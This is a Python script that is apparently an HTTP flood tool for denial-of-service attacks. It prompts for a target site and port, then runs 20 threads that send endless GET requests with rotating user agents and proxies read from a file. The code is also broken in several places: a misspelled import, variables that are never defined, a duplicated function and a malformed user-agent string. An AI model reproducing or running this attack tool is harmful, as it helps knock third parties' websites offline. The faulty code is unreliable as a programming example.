import socket
import threading
import random
import queue
import request

target = input("target site : ")
port = int(input("Default 80 : "))

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (X11; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0”, “Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko", 
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0",
    "Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 15_0_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/94.0.4606.76 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Opera/80.0.4170.40 Safari/537.36"
]

def Random_IP():
    IP = ".".join(map(str,(random.randint(0,255)for _ in range(4))))
    return IP

def Use_proxies():
        proxy_list = []     
        proxy = random.choice(proxy_list)
        proxies = {
                "http": f"http://{proxy}",
                "https": f"http://{proxy}"
        }
        return proxies
def Use_proxies():
    proxy_list = []
    file_name = input("Enter the file name: ") # get the file name from the user
    with open(file_name) as f: # open the file
        for line in f: # read each line
            proxy_list.append(line.strip()) # add the line to the proxy list
    proxies = {
        "http": f"http://{random.choice(proxy_list)}",
        "https": f"http://{random.choice(proxy_list)}"
    }
    return proxies


attack_num = 0
def attack():
    while True:
        user_agent = random.choice(user_agents)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        request = f"GET / HTTP/1.1\r\nHost: {target}:{port}\r\nUser-Agent: {user_agent}\r\nUse_proxies: {proxies}\r\nRandom_IP: {len(IP)}\r\n\r\n{IP}"
        s.send(request)
        resp = s.recv(4096)
        headers = {
            "Host": f"{target}:{port}",
            "User-Agent": user_agent,
            "Use_proxies": proxies,
            "Random_IP": len(IP)
        }
        response = requests.get(target, headers=headers, proxies=proxies)
        print(response.status_code)
        print(response.text)
        
        global attack_num
        attack_num += 1
        print(attack_num)
        s.close()
        
for i in range(20):
    task_queue = queue.Queue()
    thread = threading.Thread(target=attack)
    while not task_queue.empty():
        task = task_queue.get()
        task_queue.put(task)
    thread.start()